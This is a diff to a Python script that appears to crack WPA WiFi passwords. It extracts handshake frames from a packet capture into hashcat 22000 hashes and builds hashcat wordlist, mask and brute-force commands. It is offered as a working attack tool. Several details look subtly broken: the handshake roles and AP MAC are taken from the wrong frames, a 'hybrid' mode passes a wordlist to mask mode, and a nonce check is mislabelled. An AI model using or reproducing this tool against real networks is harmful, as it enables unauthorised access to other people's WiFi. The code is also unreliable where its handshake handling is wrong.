@@ -152,15 +152,21 @@ def extract_hashes(pcap_path, ssid, ap_mac_hint=None):
                 continue
             pairs += 1
             m1f, m3f = m1[0], m3[0]
-            sta_mac = m1f['src_mac']
-            anonce = m1f['nonce']
-            key_mic = m3f['mic']
-            ek_raw = m3f['raw']
+            # AP MAC: dst of M1 (or use hint)
+            ap_mac = m1f['dst_mac'] or ap_mac_detected or '6c4f894ca0e4'
+            sta_mac = m1f['src_mac']  # STA sends M1
+            anonce = m1f['nonce']     # ANonce from M1
+            key_mic = m3f['mic']      # MIC from M3 (16 bytes)
+            ek_raw = m3f['raw']       # Full EAPOL frame from M3
             eapol_len = len(ek_raw)
+            # Build full EAPOL frame: version(1) + type(1) + length(2) + EAPOL_KEY
             full_frame = bytes([1, 0x03]) + eapol_len.to_bytes(2, 'big') + ek_raw
             eapol_hex = full_frame.hex()
-            hash_str = f"WPA*02*{key_mic}*{ap_mac_detected or '6c4f894ca0e4'}*{sta_mac}*{ssid_hex}*{anonce}*{eapol_hex}*03"
+            hash_str = f"WPA*02*{key_mic}*{ap_mac}*{sta_mac}*{ssid_hex}*{anonce}*{eapol_hex}*03"
             hashes.append(hash_str)
+            # Verify nonces
+            if m1f['nonce'] == m3f['nonce']:
+                log(f"  ⚠️ RSC {rsc}: ANonce == SNonce (truncated?)")
         
         log(f"M1+M3 pairs: {pairs}")
         hash_file = str(Path(pcap_path).with_suffix('.hc22000'))
@@ -193,14 +199,18 @@ def crack_hashes(hash_file, wordlist_key, rules_key=None, mode="0", mask=None):
                f"--hwmon-temp-abort={TEMP_CRIT}", "-w", "2",
                "--potfile-path", POTFILE]
         if mode == "0":
+            # Straight: wordlist (with optional rules)
             cmd.extend(["-a", "0", hash_file, wordlist])
             if rules:
                 cmd.extend(["-r", rules])
         elif mode == "3":
+            # Hybrid: wordlist + mask
             cmd.extend(["-a", "3", hash_file, wordlist, mask or "?d?d?d?d?d?d?d?d"])
         elif mode == "1":
+            # Brute force: mask only
             cmd.extend(["-a", "3", hash_file, mask or "?d?d?d?d?d?d?d?d"])
         elif mode == "mask":
+            # Mask attack: mask only (alias for 1)
             cmd.extend(["-a", "3", hash_file, mask or "?d?d?d?d?d?d?d?d"])
         log(f"CMD: {' '.join(cmd)}")
         # Remove --quiet to see progress
